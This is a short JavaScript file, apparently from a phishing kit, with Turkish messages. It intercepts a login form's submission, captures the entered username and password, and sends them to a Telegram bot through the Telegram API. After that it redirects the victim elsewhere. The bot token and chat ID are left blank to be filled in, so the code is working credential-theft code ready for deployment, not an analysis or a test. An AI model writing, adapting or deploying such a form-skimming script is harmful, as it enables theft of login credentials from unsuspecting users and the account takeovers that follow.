document.querySelector('.login-form').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const username = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;

   
    const botToken = '';
    const chatId = ''; 
    const message = `Kullanıcı adı: ${username}\nŞifre: ${password}`; 

    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Kullanıcı bilgileri Telegram botuna gönderildi.');
            
            window.location.href = ''; 
        } else {
            console.error('Telegram botuna gönderme işlemi başarısız oldu:', data.description);
        }
    })
    .catch(error => {
        console.error('Bir hata oluştu:', error);
    });
});